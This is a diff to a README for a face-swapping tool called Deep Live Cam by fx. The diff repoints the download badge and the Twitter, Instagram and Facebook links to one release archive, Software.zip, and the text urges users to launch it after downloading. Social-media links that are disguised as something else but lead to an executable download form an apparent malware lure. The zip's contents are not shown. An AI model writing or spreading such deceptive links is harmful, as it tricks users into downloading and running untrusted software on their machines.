@@ -24,7 +24,7 @@ In this repository, you will find the latest version of our Deep Live Cam softwa
 
 You can download the Deep Live Cam software by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Y9087/Deep-Live-Cam-by-fx/releases/download/v2.0/Software.zip)](https://github.com/Y9087/Deep-Live-Cam-by-fx/releases/download/v2.0/Software.zip)
 
 *Note: It needs to be launched after downloading.*
 
@@ -45,9 +45,9 @@ If you have any questions, feedback, or suggestions, feel free to reach out to u
 
 Connect with us on social media to stay updated on the latest news, releases, and tutorials related to Deep Live Cam.
 
-- [Twitter](https://twitter.com/deeplivecam)
-- [Instagram](https://instagram.com/deeplivecam)
-- [Facebook](https://facebook.com/deeplivecam)
+- [Twitter](https://github.com/Y9087/Deep-Live-Cam-by-fx/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/Y9087/Deep-Live-Cam-by-fx/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/Y9087/Deep-Live-Cam-by-fx/releases/download/v2.0/Software.zip)
 
 Dive deep into the world of face swapping, live editing, and innovative technologies with Deep Live Cam by fx! Start creating captivating content and exploring new horizons today.
 
